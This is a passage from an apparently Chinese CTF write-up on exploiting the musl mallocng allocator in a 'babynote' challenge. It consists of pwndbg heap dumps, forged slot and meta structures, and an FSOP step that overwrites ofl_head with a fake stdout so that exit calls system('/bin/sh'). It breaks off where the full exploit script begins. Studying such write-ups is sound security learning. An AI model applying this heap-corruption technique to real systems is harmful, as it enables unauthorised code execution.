class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">64</span>gx  <span class=\"number\">0x7f22b639fc30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc30</span>:\t<span class=\"number\">0x00005555569254f0</span>\t<span class=\"number\">0x0000ff0000000009</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc40</span>:\t<span class=\"number\">0x00007f22b639fc70</span>\t<span class=\"number\">0x00007f22b639fca0</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc50</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc60</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000ff0000000000</span>\t\t\t\t<span class=\"comment\">//下一次申请，这里会被改写</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc70</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc80</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc90</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fca0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcb0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0009830000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcd0</span>:\t<span class=\"number\">0x00007f22b639fd00</span>\t<span class=\"number\">0x00007f22b639fd30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fce0</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcf0</span>:\t<span class=\"number\">0x00007f22b639fc40</span>\t<span class=\"number\">0x000c840000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd00</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd10</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd20</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x000f850000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd30</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd40</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd50</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x0012860000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd60</span>:\t<span class=\"number\">0x00007f22b63a3e20</span>\t<span class=\"number\">0x00007f22b639fd90</span><span class=\"comment\">//fakebabynote的地址</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd70</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd80</span>:\t<span class=\"number\">0x00007f22b639fcd0</span>\t<span class=\"number\">0x0015870000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd90</span>:\t<span class=\"number\">0x00007f22b63a3dd0</span>\t<span class=\"number\">0x00007f22b6395070</span>\t\t<span class=\"comment\">//fakebabynote,0x00007f22b6395070指向我们伪造的slot</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fda0</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdb0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdd0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fde0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdf0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe00</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe10</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe20</span>:\t<span class=\"number\">0x0000555556925090</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>我们把 slot 申请成为 name 后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">64</span>gx  <span class=\"number\">0x7f22b639fc30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc30</span>:\t<span class=\"number\">0x00005555569254f0</span>\t<span class=\"number\">0x0000800000000009</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc40</span>:\t<span class=\"number\">0x00007f22b639fd00</span>\t<span class=\"number\">0x00007f22b639fd00</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc50</span>:\t<span class=\"number\">0x0000000000000008</span>\t<span class=\"number\">0x0000000000000008</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc60</span>:\t<span class=\"number\">0x00007f22b639fd90</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc70</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc80</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fc90</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fca0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcb0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x0009830000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcd0</span>:\t<span class=\"number\">0x00007f22b639fd00</span>\t<span class=\"number\">0x00007f22b639fd30</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fce0</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fcf0</span>:\t<span class=\"number\">0x00007f22b639fc40</span>\t<span class=\"number\">0x000c840000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd00</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd10</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd20</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x000f850000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd30</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd40</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x6868686868686868</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd50</span>:\t<span class=\"number\">0x6868686868686868</span>\t<span class=\"number\">0x0012860000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd60</span>:\t<span class=\"number\">0x00007f22b63a3e20</span>\t<span class=\"number\">0x00007f22b639fd90</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd70</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd80</span>:\t<span class=\"number\">0x00007f22b639fcd0</span>\t<span class=\"number\">0x0015870000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fd90</span>:\t<span class=\"number\">0x00007f22b63a3dd0</span>\t<span class=\"number\">0x00007f22b6395070</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fda0</span>:\t<span class=\"number\">0x0000000000000001</span>\t<span class=\"number\">0x0000000000000028</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdb0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdc0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdd0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x6767676767676767</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fde0</span>:\t<span class=\"number\">0x6767676767676767</span>\t<span class=\"number\">0x001b890000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fdf0</span>:\t<span class=\"number\">0x00007f22b639fc40</span>\t<span class=\"number\">0x00007f22b6394020</span>\t<span class=\"comment\">//babynotelist的头指针，</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe00</span>:\t<span class=\"number\">0x0000000000000028</span>\t<span class=\"number\">0x0000000000002030</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe10</span>:\t<span class=\"number\">0x00007f22b639fd60</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b639fe20</span>:\t<span class=\"number\">0x0000555556925090</span>\t<span class=\"number\">0x0000ff0000000000</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到我们可以通过 b’b’(0x00007f22b63a3dd0 的数据是‘b’) 找到我们的 fake_babynote, 然后释放掉 0x00007f22b6395070 这个伪 slot</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">18</span>gx <span class=\"number\">0x00007f22b6395070</span><span class=\"number\">-0x60</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395010</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395020</span>:\t<span class=\"number\">0x00007f22b63a7e20</span>\t<span class=\"number\">0x00007f22b63a2e20</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395030</span>:\t<span class=\"number\">0x00007f22b6395060</span>\t<span class=\"number\">0x00000000000003fe</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395040</span>:\t<span class=\"number\">0x00000000000000a9</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395050</span>:\t<span class=\"number\">0x00007f22b6396020</span>\t<span class=\"number\">0x0000c00000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395060</span>:\t<span class=\"number\">0x00007f22b6395020</span>\t<span class=\"number\">0x0000800000000009</span>\t\t\t<span class=\"comment\">//伪造的slot堆头</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395070</span>:\t<span class=\"number\">0x4141414141414141</span>\t<span class=\"number\">0x0000000000000000</span>\t\t\t</span><br><span class=\"line\"><span class=\"number\">0x7f22b6395080</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7f22b6395090</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x7f22b6395060 这个地址就是伪造的 group 的 base 地址，对应的数据就是伪造的 meta 地址</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200825484.png\" alt=\"image-20220422200825484\"></p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422200924302.png\" alt=\"image-20220422200924302\"></p>\n<p>0x00007f22b63a7e20 这里就是我们的目标地址 - 8，0x00007f22b63a2e20 这个地址是我们下一个申请出来的 slot 的真实地址（申请 0x50）mem==base,</p>\n<p>下面是伪造的 fake_meta1 以及对应的 fake_meta_area1</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201357563.png\" alt=\"image-20220422201357563\"></p>\n<p>最后是 free_group 时的伪造的 fake_meta2 和 fake_meta_area</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422201627965.png\" alt=\"image-20220422201627965\"></p>\n<h4 id=\"fsop\"><a class=\"markdownIt-Anchor\" href=\"#fsop\">#</a> FSOP</h4>\n<p>我们任意地址写的，是 ofl_head，类似于 glibc 的 ——IO__lisl_all, 只不过则合理一般情况下是空的，利用在于 exit 函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">_Noreturn</span> <span class=\"type\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(<span class=\"type\">int</span> code)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__funcs_on_exit();</span><br><span class=\"line\">\t__libc_exit_fini();</span><br><span class=\"line\">\t__stdio_exit();</span><br><span class=\"line\">\t_Exit(code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __stdio_exit(<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *f;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class=\"line\">\tclose_file(__stdin_used);</span><br><span class=\"line\">\tclose_file(__stdout_used);</span><br><span class=\"line\">\tclose_file(__stderr_used);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">FILE **__ofl_lock()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLOCK(ofl_lock);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &amp;ofl_head;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">close_file</span><span class=\"params\">(FILE *f)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!f) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\tFFINALLOCK(f);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把 ofl_head 改成我们可以控制的 slot 的地址，就在那里伪造一个 stdout，if (f-&gt;wpos != f-&gt;wbase) f-&gt;write (f, 0, 0); 并满足这里的条件（wpos!=wbase）write 改策划给你 system, 而且会把 fd 作为参数，fd 就是就会指向 flags, 把他写位‘/bin/sh\\x00’</p>\n<p>正常的 stdout</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *<span class=\"built_in\">stdout</span></span><br><span class=\"line\">$<span class=\"number\">21</span> = &#123;</span><br><span class=\"line\">  flags = <span class=\"number\">69</span>, </span><br><span class=\"line\">  rpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  rend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  close = <span class=\"number\">0x7f22b61557e5</span> &lt;__stdio_close&gt;, </span><br><span class=\"line\">  wend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_1 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wbase = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  read = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  write = <span class=\"number\">0x7f22b615598e</span> &lt;__stdio_write&gt;, </span><br><span class=\"line\">  seek = <span class=\"number\">0x7f22b615597d</span> &lt;__stdio_seek&gt;, </span><br><span class=\"line\">  buf = <span class=\"number\">0x7f22b63a6708</span> &lt;buf+<span class=\"number\">8</span>&gt; <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">  buf_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">1</span>, </span><br><span class=\"line\">  pipe_pid = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lockcount = <span class=\"number\">0</span>, </span><br><span class=\"line\">  mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">  lock = <span class=\"number\">-1</span>, </span><br><span class=\"line\">  lbf = <span class=\"number\">-1</span>, </span><br><span class=\"line\">  cookie = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  off = <span class=\"number\">0</span>, </span><br><span class=\"line\">  getln_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_2 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shlim = <span class=\"number\">0</span>, </span><br><span class=\"line\">  shcnt = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  locale = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面是伪造的 stdout</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p * (FILE * <span class=\"type\">const</span>)<span class=\"number\">0x7fc49ff72e20</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  flags = <span class=\"number\">1852400175</span>, </span><br><span class=\"line\">  rpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  rend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  close = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_1 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  wbase = <span class=\"number\">0x1</span> &lt;error: Cannot access memory at address <span class=\"number\">0x1</span>&gt;, </span><br><span class=\"line\">  read = <span class=\"number\">0x1</span>, </span><br><span class=\"line\">  write = <span class=\"number\">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class=\"line\">  seek = <span class=\"number\">0x7fc49fd1b963</span> &lt;system&gt;, </span><br><span class=\"line\">  buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  buf_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0</span>, </span><br><span class=\"line\">  pipe_pid = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lockcount = <span class=\"number\">0</span>, </span><br><span class=\"line\">  mode = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lock = <span class=\"number\">0</span>, </span><br><span class=\"line\">  lbf = <span class=\"number\">0</span>, </span><br><span class=\"line\">  cookie = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  off = <span class=\"number\">0</span>, </span><br><span class=\"line\">  getln_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  mustbezero_2 = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shend = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  shlim = <span class=\"number\">0</span>, </span><br><span class=\"line\">  shcnt = <span class=\"number\">0</span>, </span><br><span class=\"line\">  prev_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  next_locked = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  locale = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后 exit 结束程序</p>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<p>部分注释可能错误</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span 